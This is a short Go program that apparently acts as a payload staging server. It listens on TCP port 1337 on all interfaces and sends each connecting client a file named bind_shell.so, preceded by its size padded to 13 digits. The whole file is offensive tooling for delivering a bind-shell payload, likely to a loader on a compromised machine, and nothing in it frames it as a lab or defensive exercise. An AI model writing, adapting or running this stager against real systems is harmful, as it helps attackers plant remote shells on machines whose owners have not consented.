package main

import "net"
import "fmt"
import "os"
import "io/ioutil"

func main(){

	// get file size of payload
	filestats, _ := os.Stat("../../payloads/bind_shell.so")

	// get the size
	filesize := filestats.Size()
	
	// listen on all interfaces
	listener, _ := net.Listen("tcp", ":1337")
	
	// run loop forever
	for{
		// accept connectionection on port
		connection, _ := listener.Accept()
		
		// send payload filesize to client w/ 0 padding to len of 13
		connection.Write([]byte(fmt.Sprintf("%013d", int(filesize))))

		// get payload data in byte array
		data, _ := ioutil.ReadFile("../../payloads/bind_shell.so")

		// transmit payload
		connection.Write(data)
	}
}
